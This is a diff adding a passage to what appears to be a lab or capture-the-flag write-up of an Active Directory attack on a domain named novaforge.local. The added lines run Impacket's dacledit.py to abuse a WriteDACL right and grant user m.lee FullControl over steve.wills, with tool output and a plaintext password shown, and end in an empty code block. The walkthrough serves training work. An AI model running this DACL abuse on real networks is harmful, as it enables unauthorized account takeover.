@@ -583,3 +583,16 @@ This user is now compromised!
 
 The user `m.lee` has WriteDACL on the user `steve.wills` which means i can give myself full control (GenericAll)
 
+```python
+dacledit.py -action 'write' -rights 'FullControl' -principal 'm.lee' -target 'steve.wills' 'novaforge.local'/'m.lee':'0816mypassword'
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20260807-181551.bak
+[*] DACL modified successfully!
+```
+
+This granted me GenericAll over this user
+
+```python
+
+```
